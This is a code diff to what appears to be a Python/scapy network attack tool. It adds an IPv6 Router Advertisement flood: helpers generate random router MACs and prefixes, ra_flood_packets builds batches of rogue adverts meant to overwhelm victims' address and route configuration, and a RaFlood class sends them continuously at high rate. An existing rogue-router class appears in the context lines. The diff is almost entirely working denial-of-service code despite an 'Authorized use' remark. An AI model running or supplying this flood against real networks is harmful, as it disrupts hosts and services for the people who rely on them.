@@ -11,10 +11,34 @@ Builders are testable; the periodic send loops are integration. Authorized use.
 from __future__ import annotations
 
 import logging
+import random
 import threading
 import time
 
 log = logging.getLogger("reforge.ndp")
+
+
+def _rand_mac(rng: random.Random) -> str:
+    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(rng.randrange(256) for _ in range(5))
+
+
+def _rand_prefix(rng: random.Random) -> str:
+    return "2001:db8:%x:%x::" % (rng.randrange(0x10000), rng.randrange(0x10000))
+
+
+def build_flood_ra(rng: random.Random):
+    """One RA for a flood: a fresh random router MAC, link-local, and prefix, so
+    each advert makes the victim configure yet another address/route."""
+    return build_ra(_rand_mac(rng), src_ll="fe80::%x" % rng.randrange(1, 0xFFFF),
+                    prefix=_rand_prefix(rng))
+
+
+def ra_flood_packets(count: int, rng: random.Random | None = None) -> list:
+    """Build `count` distinct rogue RAs (each a different router/prefix) — the
+    classic IPv6 RA flood that overwhelms hosts' address/route configuration.
+    Pure builder, so it is testable without a NIC."""
+    rng = rng or random.Random()
+    return [build_flood_ra(rng) for _ in range(count)]
 
 
 def build_na(target_ip6: str, our_mac: str, dst_ip6: str, dst_mac: str = "33:33:00:00:00:01"):
@@ -97,6 +121,41 @@ class RogueRouter:  # pragma: no cover (needs root + IPv6)
             sendp(build_ra(self.our_mac, prefix=self.prefix), iface=self.iface, verbose=False)
             self.sent += 1
             time.sleep(self.interval)
+
+    def stop(self):
+        self._running.clear()
+        if self._t:
+            self._t.join(timeout=2.0)
+
+
+class RaFlood:  # pragma: no cover (needs root + IPv6)
+    """IPv6 RA flood: blast batches of RAs with distinct random routers/prefixes."""
+
+    def __init__(self, iface, rate: int = 400, batch: int = 50, seed: int | None = None):
+        self.iface = iface
+        self.rate = rate            # target RAs/sec
+        self.batch = batch
+        self.rng = random.Random(seed)
+        self._t = None
+        self._running = threading.Event()
+        self.sent = 0
+
+    def start(self):
+        self._running.set()
+        self._t = threading.Thread(target=self._loop, daemon=True)
+        self._t.start()
+
+    def _loop(self):
+        from scapy.sendrecv import sendp
+
+        while self._running.is_set():
+            pkts = ra_flood_packets(self.batch, self.rng)
+            sendp(pkts, iface=self.iface, verbose=False)
+            self.sent += len(pkts)
+            time.sleep(max(self.batch / max(self.rate, 1), 0.01))
+
+    def status(self) -> dict:
+        return {"running": self._running.is_set(), "sent": self.sent}
 
     def stop(self):
         self._running.clear()
